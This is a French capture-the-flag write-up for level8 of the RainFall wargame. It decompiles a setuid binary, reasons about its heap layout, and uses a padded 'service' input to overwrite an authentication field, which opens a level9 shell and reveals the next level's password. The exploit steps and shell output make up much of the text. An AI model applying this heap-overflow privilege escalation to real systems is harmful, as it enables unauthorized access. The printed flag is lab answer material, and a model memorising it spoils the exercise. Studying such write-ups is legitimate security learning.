Je commence par découvrir qui je suis, où je suis, et qu'est-ce qui est à ma disposition :

```
$ id && pwd && ls -la
uid=2008(level8) gid=2008(level8) groups=2008(level8),100(users)
/home/user/level8
total 17
dr-xr-x---+ 1 level8 level8   80 Mar  6  2016 .
dr-x--x--x  1 root   root    340 Sep 23  2015 ..
-rw-r--r--  1 level8 level8  220 Apr  3  2012 .bash_logout
-rw-r--r--  1 level8 level8 3530 Sep 23  2015 .bashrc
-rwsr-s---+ 1 level9 users  6057 Mar  6  2016 level8
-rw-r--r--+ 1 level8 level8   65 Sep 23  2015 .pass
-rw-r--r--  1 level8 level8  675 Apr  3  2012 .profile
```

Je tente de lancer le binaire level8 :

```
$ ./level8
(nil), (nil)
da
(nil), (nil)
da da
(nil), (nil)
^C
```

Je tente avec un input :

```
$ ./level8 da
(nil), (nil)
^C
```

Puis 2 input :

```
$ ./level8 da da
(nil), (nil)
^C
```

Sans succès, je me penche dès lors sur la décompilation.
J'utilise [Dogbolt](https://dogbolt.org/?id=c81dd233-7ccb-4ab8-8074-27857c96eb14) afin de décompiler le binaire du level 8 :

### Ghidra

```c
main(void) {
  char cVar1;
  char *pcVar2;
  int iVar3;
  uint uVar4;
  byte *pbVar5;
  byte *pbVar6;
  bool bVar7;
  undefined uVar8;
  undefined uVar9;
  bool bVar10;
  undefined uVar11;
  byte bVar12;
  byte local_90 [5];
  char local_8b [2];
  char acStack_89 [125];
  
  bVar12 = 0;
  do {
    printf("%p, %p \n",auth,service);
    pcVar2 = fgets((char *)local_90,0x80,stdin);
    bVar7 = false;
    bVar10 = pcVar2 == (char *)0x0;
    if (bVar10) {
      return 0;
    }
    iVar3 = 5;
    pbVar5 = local_90;
    pbVar6 = (byte *)"auth ";
    do {
      if (iVar3 == 0) break;
      iVar3 = iVar3 + -1;
      bVar7 = *pbVar5 < *pbVar6;
      bVar10 = *pbVar5 == *pbVar6;
      pbVar5 = pbVar5 + (uint)bVar12 * -2 + 1;
      pbVar6 = pbVar6 + (uint)bVar12 * -2 + 1;
    } while (bVar10);
    uVar8 = 0;
    uVar11 = (!bVar7 && !bVar10) == bVar7;
    if ((bool)uVar11) {
      auth = (undefined4 *)malloc(4);
      *auth = 0;
      uVar4 = 0xffffffff;
      pcVar2 = local_8b;
      do {
        if (uVar4 == 0) break;
        uVar4 = uVar4 - 1;
        cVar1 = *pcVar2;
        pcVar2 = pcVar2 + (uint)bVar12 * -2 + 1;
      } while (cVar1 != '\0');
      uVar4 = ~uVar4 - 1;
      uVar8 = uVar4 < 0x1e;
      uVar11 = uVar4 == 0x1e;
      if (uVar4 < 0x1f) {
        strcpy((char *)auth,local_8b);
      }
    }
    iVar3 = 5;
    pbVar5 = local_90;
    pbVar6 = (byte *)"reset";
    do {
      if (iVar3 == 0) break;
      iVar3 = iVar3 + -1;
      uVar8 = *pbVar5 < *pbVar6;
      uVar11 = *pbVar5 == *pbVar6;
      pbVar5 = pbVar5 + (uint)bVar12 * -2 + 1;
      pbVar6 = pbVar6 + (uint)bVar12 * -2 + 1;
    } while ((bool)uVar11);
    uVar9 = 0;
    uVar8 = (!(bool)uVar8 && !(bool)uVar11) == (bool)uVar8;
    if ((bool)uVar8) {
      free(auth);
    }
    iVar3 = 6;
    pbVar5 = local_90;
    pbVar6 = (byte *)"service";
    do {
      if (iVar3 == 0) break;
      iVar3 = iVar3 + -1;
      uVar9 = *pbVar5 < *pbVar6;
      uVar8 = *pbVar5 == *pbVar6;
      pbVar5 = pbVar5 + (uint)bVar12 * -2 + 1;
      pbVar6 = pbVar6 + (uint)bVar12 * -2 + 1;
    } while ((bool)uVar8);
    uVar11 = 0;
    uVar8 = (!(bool)uVar9 && !(bool)uVar8) == (bool)uVar9;
    if ((bool)uVar8) {
      uVar11 = (byte *)0xfffffff8 < local_90;
      uVar8 = acStack_89 == (char *)0x0;
      service = strdup(acStack_89);
    }
    iVar3 = 5;
    pbVar5 = local_90;
    pbVar6 = (byte *)"login";
    do {
      if (iVar3 == 0) break;
      iVar3 = iVar3 + -1;
      uVar11 = *pbVar5 < *pbVar6;
      uVar8 = *pbVar5 == *pbVar6;
      pbVar5 = pbVar5 + (uint)bVar12 * -2 + 1;
      pbVar6 = pbVar6 + (uint)bVar12 * -2 + 1;
    } while ((bool)uVar8);
    if ((!(bool)uVar11 && !(bool)uVar8) == (bool)uVar11) {
      if (auth[8] == 0) {
        fwrite("Password:\n",1,10,stdout);
      }
      else {
        system("/bin/sh");
      }
    }
  } while( true );
}
```

### Hexray

```c
int main(int argc, const char **argv, const char **envp)
{
  char s[5]; // [esp+20h] [ebp-88h] BYREF
  char v5[2]; // [esp+25h] [ebp-83h] BYREF
  char v6[129]; // [esp+27h] [ebp-81h] BYREF

  while ( 1 )
  {
    printf("%p, %p \n", auth, (const void *)service);
    if ( !fgets(s, 128, stdin) )
      break;
    if ( !memcmp(s, "auth ", 5u) )
    {
      auth = (char *)malloc(4u);
      *(_DWORD *)auth = 0;
      if ( strlen(v5) <= 0x1E )
        strcpy(auth, v5);
    }
    if ( !memcmp(s, "reset", 5u) )
      free(auth);
    if ( !memcmp(s, "service", 6u) )
      service = (int)strdup(v6);
    if ( !memcmp(s, "login", 5u) )
    {
      if ( *((_DWORD *)auth + 8) )
        system("/bin/sh");
      else
        fwrite("Password:\n", 1u, 0xAu, stdout);
    }
  }
  return 0;
}
```

De la même manière qu'au précédent niveau, j'observe les différentes décompilations utiliser beaucoup de variable différentes (voir `Ghidra`), j'en extrapole d'abord donc la présence d'une structure afin de diminuer le nombre de variable.

J'imagine que la décompilation présentée par `Hexray` elle, représente ces différentes variables au travers d'array.

Je note également la présence de variables nommées '`auth`' et '`password`', ainsi que des strings litérale `"login"`, '`service`', etc..
Le binaire semble agir comme une sorte de menu dans lequel on peut modifier des informations en écrivant un choix.

Je vérifie cette hypothèse :

```
$ ./level8
(nil), (nil)
auth adam
0x804a008, (nil)
-> stdin ici <-
```

Ok, c'est donc bien un binaire qui agit comme une sorte de menu. J'analyse ses fonctions (en m'appuyant sur la version de `Hexray`):

- `auth` semble déclarer un nouvel utilisateur.
- `reset` semble `free` (supprimer) cet utilisateur
- `service` semble stocker une valeur dans la variable globale `service`.
- `login` semble être la clé de ce level, il semble que `login` vérifie le password et, si il est bon, donne accès au shell.

Dans la décompilation d'`Hexray`, je note que `v6` et `v5` ne se voient jamais attribué une valeur, et qu'ils semblent correspondre à une tentative d'`Hexray` de représenter un offset. `v6` fait presque la taille de la limite de byte lus par `fgets()`. `s` semble avoir une taille arbitraire de `5`, qui est la taille minimum de toutes les string litérale du "menu". Cela me renforce à l'idée que la décompilation tente de représenter des offset au travers de la stack.

Cela devient assez évident ici :
```
      if ( strlen(v5) <= 0x1E )
        strcpy(auth, v5);
```
Où `0x1E` vaut 30 et `v5` vaut 2, cette comparaison n'aurait pas de sens d'exister et repose probablement sur l'agencement dans la stack.

`Hexray` semble également faire référence à une structure `_DWORD`/`auth` lors de l'`auth` et du `login`. je vais donc créer une structure `user` pour la représenter.

Je simplifie un code possible pour le binaire ci-dessous à partir de ces informations et en conjonction avec le code très verbose de `Ghidra` :

```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

struct user { // <- _DWORD in Hexray
    int id; // <- voir 'auth ' dans Hexray
    char login[28]; // <- ou peut-être 30. Dans Hexray, `v5` représenterait cette variable, et elle fait 2 de longueur, et compare si sa taille <= 30
    int authenticated; // <- voir 'login' dans Hexray, on voit l'appel à la structure `auth` mais 8 bytes plus loin, impliquant probablement cette seconde variable
};

int *service; // <- mentionné dans le printf de Hexray
struct user *user; 

int main() {
    while (1) {
        printf("%p, %p \n", user, service);

        char buffer[128]; // <- Je fusionne les trois variable de Hexray en une seule, représentant le buffer d'écriture pour fgets()

        if (!(fgets(buffer, 128, stdin)))
            break;

        if (!(strncmp(buffer, "auth ", 5))) {
            user = malloc(4);
            user->id = 0; // Pour imiter Hexray, j'attribue la valeur 0 à la première valeur pointant sur auth (Hexray semble représenter une variable de sa structure auth avec _DWORD)

            if (strlen(buffer + 5) <= 30) // Je vérifie que le buffer (+ 5 pour passer la string "auth ") est inférieure à 30
                strcpy(user, buffer + 5); // Si oui, copie la valeur du buffer sur le pointeur de la structure user (vulnérabilité ici ?)
        }

        if (!(strncmp(buffer, "reset", 5)))
            free(user);

        if (!(strncmp(buffer, "service", 6)))
            service = strdup(buffer + 7); // Ici je fais comme pour l'option "auth " et j'utilise le buffer avec un offset

        if (!(strncmp(buffer, "login", 5))) {
            if (user->authenticated) // Ici j'extrapole que le + 8 dans Hexray signifierait 2 * 4 bytes plus loin dans la structure auth, donc son 3eime paramètre
                system("/bin/sh");
            else
                fwrite("Password:\n", 1, 10, stdout);
        }
    }
    return 0;
}
```

Je vais essayer d'exploiter le binaire en me basant sur mon interprétation de son fonctionnement énoncé ci-dessus. Je reviendrais sur mon interprétation plus tard si cela échoue.

Si mon interprétation est correcte, alors la vulnérabilité est évidente :

```c
    if (!(strncmp(buffer, "auth ", 5))) {
        user = malloc(4);
        user->id = 0;

        if (strlen(buffer + 5) <= 30) 
            strcpy(user, buffer + 5);
    }
```

Ici, on observe que la structure `user` se voit attribué seulement 4 bytes. Or, d'après ma proposition de la représentation du binaire, la structure nécessiterait plus d'espace que 4 bytes.

Je tente d'obtenir plus d'information en utilisant `ltrace` et en appellant `auth ` :

```
$ ltrace ./level8
__libc_start_main(0x8048564, 1, 0xbffff804, 0x8048740, 0x80487b0 <unfinished ...>
printf("%p, %p \n", (nil), (nil)(nil), (nil)
)                                                           = 14
fgets(auth
"auth \n", 128, 0xb7fd1ac0)                                 = 0xbffff6e0
malloc(4)                                                   = 0x0804a008
strcpy(0x0804a008, "\n")                                    = 0x0804a008
printf("%p, %p \n", 0x804a008, (nil)0x804a008, (nil)
)                                                           = 18
fgets(
```

Puis en appellant `service` :

```
fgets(service
"service\n", 128, 0xb7fd1ac0)                               = 0xbffff6e0
strdup("\n")                                                = 0x0804a018
printf("%p, %p \n", 0x804a008, 0x804a0180x804a008, 0x804a018
)                                                           = 22
fgets(
```

Si je maintiens mon idée que le login est de taille 28 ou 30 (incertitude sur ce point) et qu'il est écrit dans la structure à l'utilisation de `auth ` dans le menu, alors le manque de byte alloué devient évident en regardant les adresses renvoyées par `ltrace`.

Au moment de `strcpy()`, la structure `user` pointe sur l'adresse : `0x0804a008` mais lorsqu'on attribue une valeur à la variable globale `service`, `ltrace` nous indique qu'on écrit à l'adresse `0x0804a018`... Ce qui est `0x10` bytes plus loin (16). 

Or, la structure `user` nécessiterait au moins 4 bytes pour son `id`, 28 ou 30 pour son login (si on se base sur la comparaison au moment de l'option `auth`), et enfin 4 bytes de plus pour le 'booléen' `authenticated` utilisé dans `login`.

La structure nécessiterait donc entre 4 + 28(ou 30) + 4 = 36 ou 38 bytes.

Si mes hypothèses sont correctes, alors, et puisque `authenticated` n'est jamais attribué nul part, puisque de toute manière écrasé par `service`, il me suffirait donc d'atteindre la variable `authenticated` et lui donner une valeur positive pour que le login fonctionne.

Je pourrais donner un payload infecté à `service`, qui est 16 bytes plus loin que le début de la structure `user`, et ajouter du padding jusqu'à que service écrive sur la valeur de notre structure `user`, a son paramètre `authenticated`.

Si je considère que l'`id` vaut 4 bytes, puis (je vais d'abord essayer avec un login de 28 bytes, puis ensuite 30) 28 bytes de `login`, puis 4 bytes pour `authenticated`, je peux en conclure qu'une fois les 16 bytes écrasés par `service`, je me trouve à (4 + 28) - 16 = 16 bytes restant pour le login, et je pourrais ensuite écrire sur `authenticated`.

Mon payload/exploit serait donc le suivant :

- Je m'`auth ` pour déclarer une structure user
- J'appelle `service` écrit 15 caractères de padding ce qui devrait donner une valeur booléenne valide à `authenticated` (j'espace service et les 15 caractère, donc le 17eime caractère devrait écrire sur `authenticated`, et ce sera le `\n`)
- J'appelle `login` et si j'obtiens le shell, alors ça signifie que j'ai bien ré-écris `authenticated`, sinon je retente avec 18 caractère de padding (cas de figure où le login faisait 30 bytes)

J'essaye mon exploit :

```
$ ./level8
(nil), (nil)
auth
(nil), (nil)
^C
level8@RainFall:~$ ./level8
(nil), (nil)
auth
0x804a008, (nil)
service ABCDEFGHIJKLMNOP (espace + 16 lettres de l'alphabet => P donnera sa valeur à user->authenticated)
0x804a008, 0x804a018
login
$ whoami
level9
$ cat /home/user/level9/.pass
c542e581c5ba5162a85f767996e3247ed619ef6c6f7b76a59435545dc6259f8a
```

C'est un succès !







